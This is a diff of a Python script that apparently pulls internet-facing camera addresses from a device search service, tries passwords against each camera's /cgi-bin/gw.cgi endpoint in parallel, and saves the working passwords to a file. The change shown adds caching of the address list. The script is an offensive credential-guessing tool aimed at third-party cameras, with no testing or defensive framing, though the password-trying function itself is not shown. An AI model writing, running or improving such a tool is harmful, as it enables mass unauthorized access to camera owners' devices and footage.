@@ -3,6 +3,7 @@ import json
 import xml.etree.ElementTree as ET
 import requests
 import numpy as np
+import os
 from multiprocessing import Pool
 
 url_suffix = "/cgi-bin/gw.cgi"
@@ -104,20 +105,22 @@ def try_out_passwords(url):
 
 
 if __name__ == "__main__":
-    cameras = acquire_all_cameras()
-    addresses = ["http://" + camera['ip_str'] + ":" + str(camera['port']) for camera in cameras]
+    if os.path.exists("addresses.json"):
+        addresses = json.load(open("addresses.json"))
+    else:
+        cameras = acquire_all_cameras()
+        addresses = ["http://" + camera['ip_str'] + ":" + str(camera['port']) for camera in cameras]
+        with open("addresses.json", 'w+') as addr_file:
+            addr_file.write(json.dumps(addresses))
     pool = Pool(6)
     actual_passwords = pool.map(try_out_passwords, addresses)
     pool.close()
     pool.join()
 
     print(actual_passwords)
-    print(addresses)
     print(invalid_list)
 
-    invalid_list = np.array(invalid_list)
     actual_passwords = np.array(actual_passwords)
-    addresses = np.array(addresses)
+    invalid_list = np.array(invalid_list)
     np.save("actual_passwords.npy", actual_passwords)
-    np.save("addresses.npy", addresses)
     np.save("invalid_list.npy", invalid_list)
